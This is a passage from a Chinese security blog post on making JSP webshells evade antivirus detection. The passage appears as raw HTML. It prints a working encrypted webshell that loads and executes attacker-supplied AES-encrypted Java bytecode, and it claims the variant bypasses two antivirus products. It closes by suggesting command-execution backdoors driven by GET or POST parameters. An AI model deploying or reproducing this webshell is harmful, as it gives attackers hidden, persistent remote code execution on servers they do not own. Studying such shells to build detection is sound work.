+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c.init(2,new SecretKeySpec((session.getValue(&#34;u&#34;)+&#34;&#34;).getBytes(),&#34;AES&#34;));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那就再把这一句给拆了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@page import=&#34;java.util.*,javax.crypto.*,javax.crypto.spec.*&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}
+</span></span><span class="line"><span class="cl">public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;
+</span></span><span class="line"><span class="cl">&lt;%if(request.getParameter(&#34;pass&#34;)!=null){String k=(&#34;&#34;+UUID.randomUUID()).replace(&#34;-&#34;,&#34;&#34;).substring(16);session.putValue(&#34;u&#34;,k);
+</span></span><span class="line"><span class="cl">out.print(k);return;}
+</span></span><span class="line"><span class="cl">Cipher c=Cipher.getInstance(&#34;AES&#34;);
+</span></span><span class="line"><span class="cl">SecretKeySpec sec=new SecretKeySpec((session.getValue(&#34;u&#34;)+&#34;&#34;).getBytes(),&#34;AES&#34;);
+</span></span><span class="line"><span class="cl"> c.init(2,sec);
+</span></span><span class="line"><span class="cl"> String uploadString= request.getReader().readLine();
+</span></span><span class="line"><span class="cl">new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这时候就可以两个都免杀了</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430104-50007ff0-0da4-49c0-82a6-0f9084263a7d.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430104-50007ff0-0da4-49c0-82a6-0f9084263a7d.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430104-50007ff0-0da4-49c0-82a6-0f9084263a7d.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430104-50007ff0-0da4-49c0-82a6-0f9084263a7d.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430104-50007ff0-0da4-49c0-82a6-0f9084263a7d.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430104-50007ff0-0da4-49c0-82a6-0f9084263a7d.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430215-cbeac806-bb8e-4dba-bc1c-82848df984c1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430215-cbeac806-bb8e-4dba-bc1c-82848df984c1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430215-cbeac806-bb8e-4dba-bc1c-82848df984c1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430215-cbeac806-bb8e-4dba-bc1c-82848df984c1.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430215-cbeac806-bb8e-4dba-bc1c-82848df984c1.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430215-cbeac806-bb8e-4dba-bc1c-82848df984c1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>5 最后</h2><p>其实还有很多方式值得去探索，就比如命令执行一句话那里。</p>
+<p>我们可以在shell里只放类加载函数，而不含具体的payload。</p>
+<p>然后写一个命令类，类里接收一个String类型的参数，作为所要执行的cmd语句。然后把它编译成二进制class，通过GET型或者POST型传过去。</p>
+<p>其中cmd参数也从GET传入，经过shell发送到命令执行类中，就相当于实现了php中形如</p>
+<p><code>http://test.com/shell.php?func=system&amp;cmd=whoami</code> 的回调函数后门。</p>
+<p>其中有一个师傅已经实现了菜刀的远程加载类，文章地址：http://p2j.cn/?p=1627</p>
+<p>不过所有的jar包都放在作者的博客上，也就是说每个shell都会先访问他的博客，还是建议自己搭建。</p>
+<p>套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。</p>
+</div>
+
+        
+
+
+<h2>相关内容</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/tomcat-memory-webshell-filter/">Tomcat内存Webshell解析之Filter型</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/jsp-classload-backdoor/">[知识星球]JSP类加载后门</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-3/">MSF免杀360&#43;火绒上线(三)</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-2/">MSF免杀360&#43;火绒上线(二)</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-1/">MSF免杀360&#43;火绒上线(一)</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-02-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/webshell-bypass-jsp/" data-title="WebShell免杀之JSP" data-hashtags="webshell,免杀"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/webshell-bypass-jsp/" data-hashtag="webshell"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/webshell-bypass-jsp/" data-title="WebShell免杀之JSP"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/webshell-bypass-jsp/" data-title="WebShell免杀之JSP"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/webshell-bypass-jsp/" data-title="WebShell免杀之JSP"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/webshell-bypass-jsp/" data-title="WebShell免杀之JSP" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;WebShell免杀之JSP&#34;, &#34;https://yzddmr6.com/posts/webshell-bypass-jsp/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/webshell/">webshell</a>,&nbsp;<a href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/antsword-diy-1/" class="prev" rel="prev" title="蚁剑改造计划之增加垃圾数据"><i class="fas fa-angle-left fa-fw"></i>蚁剑改造计划之增加垃圾数据</a>
+            <a href="/posts/jsp-classload-backdoor/" class="next" rel="next" title="[知识星球]JSP类加载后门">[知识星球]JSP类加载后门<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
